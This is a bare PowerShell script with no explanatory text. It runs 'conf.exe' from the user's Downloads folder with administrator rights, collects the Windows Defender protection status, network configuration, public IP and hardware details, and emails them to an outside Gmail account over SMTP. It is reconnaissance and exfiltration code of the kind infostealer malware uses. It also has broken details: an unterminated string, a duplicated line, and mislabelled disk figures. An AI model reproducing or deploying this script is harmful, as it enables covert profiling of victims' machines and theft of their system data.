$pc_username = $ENV:USERNAME
$download_path = "C:\Users\$pc_username\Downloads"
Start-Process "$download_path\conf.exe" -Verb RunAs 
$attachment_path = $ENV:USERPROFILE


############################WINDOWS-DEFENDER###################################

$computer_stat = Get-MpComputerStatus -ErrorAction SilentlyContinue -WarningAction SilentlyContinue |
    Select-Object AntivirusEnabled, AntispywareEnabled, RealTimeProtectionEnabled, BehaviorMonitoringEnabled, IOAVProtectionEnabled, OnAccessProtectionEnabled, SubmitSamplesConsent, MapsReportingEnabled, QuickScanAge, FullScanAge

foreach ($status in $computer_stat) {
    $output += "AntivirusEnabled: $($status.AntivirusEnabled)`n"
    $output += "AntispywareEnabled: $($status.AntispywareEnabled)`n"
    $output += "RealTimeProtectionEnabled: $($status.RealTimeProtectionEnabled)`n"
    $output += "RealTimeProtectionEnabled: $($status.RealTimeProtectionEnabled)`n"
    $output += "BehaviorMonitoringEnabled: $($status.BehaviorMonitoringEnabled)`n"
    $output += "IOAVProtectionEnabled: $($status.IOAVProtectionEnabled)`n"
    $output += "OnAccessProtectionEnabled: $($status.OnAccessProtectionEnabled)`n"
    $output += "SubmitSamplesConsent: $($status.SubmitSamplesConsent)`n"
    $output += "MapsReportingEnabled: $($status.MapsReportingEnabled)`n"
    $output += "QuickScanAge: $($status.QuickScanAge)`n"
    $output += "FullScanAge: $($status.FullScanAge)`n"
}



############################IP-CONFIGURATIONS###################################

$ipconfigurations = Get-NetIPConfiguration
$public_ip = (Invoke-WebRequest -Uri "https://api.ipify.org").Content

foreach ($ipconfig in $ipconfigurations) {
    $output += "Interface Alias: $($ipconfig.InterfaceAlias)`n"
    $output += "IPv4 Address: $($ipconfig.IPv4Address.IPAddress)`n"
    $output += "IPv4 Subnet Mask: $($ipconfig.IPv4Address.SubnetMask)`n"
    $output += "IPv4 Default Gateway: $($ipconfig.IPv4DefaultGateway.NextHop)`n"
    $output += "DNS Server: $($ipconfig.DNSServer.ServerAddresses)`n"
    $output += "--------------------------`n"
}
$output += "Public IP: $($public_ip)`n"


############################STORAGER###################################

$os = Get-CimInstance Win32_OperatingSystem
$processor = Get-CimInstance Win32_Processor
$memory = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"

$output += "Operating System: $($os.Caption) $($os.Version)`n"
$output += "Processor: $($processor.Name)`n"
$output += "Memory: $($memory.Sum / 1GB) GB`n"
$output += "Disk Space: $($disk.Size / 1GB) GB Free of $($disk.FreeSpace / 1GB) GB`n"
# $output += "Computer Status: $($computer_stat)`n"


############################SMTP_SERVER###################################

$smtpServer = "smtp.gmail.com"
$smtp_port = 587
$smtp_email = "
$smtp_password = ""
$mail_to = "@gmail.com"
$mail_from = "@gmail.com"
$mail_subject = "Ipconfig"

$mail_txt = "$output"

Send-MailMessage -To $mail_to -From $mail_from -Subject $mail_subject -Body $mail_txt -SmtpServer $smtpServer -Port $smtp_port -UseSsl -Credential (New-Object System.Management.Automation.PSCredential ($smtp_email, (ConvertTo-Securestring $smtp_password -AsPlainText -Force))) 
